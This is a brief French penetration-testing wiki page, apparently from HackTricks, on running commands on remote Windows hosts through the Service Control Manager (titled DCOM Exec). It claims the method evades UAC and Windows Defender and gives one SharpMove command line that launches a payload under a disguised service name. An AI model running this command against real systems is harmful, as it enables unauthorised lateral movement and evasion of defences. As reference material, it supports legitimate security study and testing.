# DCOM Exec

{{#include ../../banners/hacktricks-training.md}}

## SCM

**SCMExec** est une technique pour exécuter des commandes sur des systèmes distants en utilisant le Service Control Manager (SCM) pour créer un service qui exécute la commande. Cette méthode peut contourner certains contrôles de sécurité, tels que le Contrôle de Compte Utilisateur (UAC) et Windows Defender.

## Tools

- [**https://github.com/0xthirteen/SharpMove**](https://github.com/0xthirteen/SharpMove):

SharpMove.exe action=scm computername=remote.host.local command="C:\windows\temp\payload.exe" servicename=WindowsDebug amsi=true

{{#include ../../banners/hacktricks-training.md}}
